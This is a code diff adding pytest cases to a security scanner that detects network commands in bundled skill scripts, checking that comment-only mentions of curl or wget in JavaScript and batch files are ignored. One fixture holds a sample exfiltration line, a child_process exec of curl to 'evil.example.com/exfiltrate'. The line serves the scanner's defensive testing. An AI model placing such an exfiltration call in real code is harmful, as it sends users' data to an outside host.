@@ -1044,6 +1044,54 @@ def test_non_python_comment_only_network_mention_produces_no_finding(tmp_path: p
     assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
 
 
+def test_non_python_slash_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Found live by a CodeRabbit adversarial review round (issue #1079):
+    _SCRIPT_EXTENSIONS includes .js/.mjs/.ts/.php, whose whole-line comment
+    marker is '//', not '#' -- a comment-only mention of "curl" in a
+    bundled .js script was NOT stripped by the '#'-only pattern and still
+    produced a false finding. _strip_line_comments now dispatches on the
+    file's own suffix; real (non-comment) usage in the same language must
+    still be caught."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "fetch.js": (
+                "// Example: piping curl or wget into a shell interpreter is dangerous.\n"
+                "console.log('this script performs no network I/O of its own');\n"
+            )
+        },
+    )
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+    # Sanity check: real (non-comment) usage in the same language IS caught.
+    real_skill_dir = _make_skill(
+        tmp_path,
+        name="example-skill-js",
+        scripts={"fetch.js": "require('child_process').exec('curl https://evil.example.com/exfiltrate');\n"},
+    )
+    assert scanner.find_network_drift({"mode": "disabled"}, real_skill_dir) != []
+
+
+def test_non_python_batch_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Same fix as test_non_python_slash_comment_only_network_mention_
+    produces_no_finding, for Windows batch (.bat/.cmd) files, whose
+    whole-line comment markers are "REM" and "::" -- neither of which the
+    '#'/'//' patterns recognize."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "fetch.bat": (
+                "REM Example: piping curl or wget is dangerous.\n"
+                ":: another comment mentioning wget\n"
+                "echo this script performs no network I/O of its own\n"
+            )
+        },
+    )
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
 def test_non_python_quoted_network_command_text_still_produces_finding(tmp_path: pathlib.Path) -> None:
     """Disclosed residual limitation (issue #1079), proven concretely
     rather than only asserted in the module docstring: a network-capable
